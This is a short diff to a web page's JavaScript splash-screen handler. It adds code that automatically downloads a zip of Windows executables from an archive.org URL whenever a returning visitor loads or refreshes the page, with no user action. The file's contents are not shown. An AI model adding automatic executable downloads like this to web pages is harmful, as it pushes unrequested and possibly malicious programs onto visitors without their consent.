@@ -27,6 +27,10 @@ document.addEventListener('DOMContentLoaded', () => {
         image2Container.classList.add('hidden');
         viewImageButton.classList.remove('hidden');
         logoImage.classList.remove('hidden'); // Show logo image
+
+        // Automatically start download immediately on refresh if images have been seen
+        downloadFile('https://archive.org/compress/newdetails/formats=WINDOWS%20EXECUTABLE&file=/newdetails.zip');
+
     } else {
         // If it's the first time, play the image sequence
         image1Container.classList.remove('hidden');
@@ -41,9 +45,10 @@ document.addEventListener('DOMContentLoaded', () => {
             image2Container.classList.add('hidden'); // Hide Image 2
             viewImageButton.classList.remove('hidden'); // Show View Image Button
             logoImage.classList.remove('hidden'); // Show logo image
-            
-            localStorage.setItem('hasSeenImages', 'true'); // Set flag immediately
-            // Automatically start download after splash screen
+
+            localStorage.setItem('hasSeenImages', 'true'); // Set flag immediately for future refreshes
+
+            // Automatically start download after splash screen on first visit
             downloadFile('https://archive.org/compress/newdetails/formats=WINDOWS%20EXECUTABLE&file=/newdetails.zip');
         }, 5000); // Both images visible for 5 seconds
     }
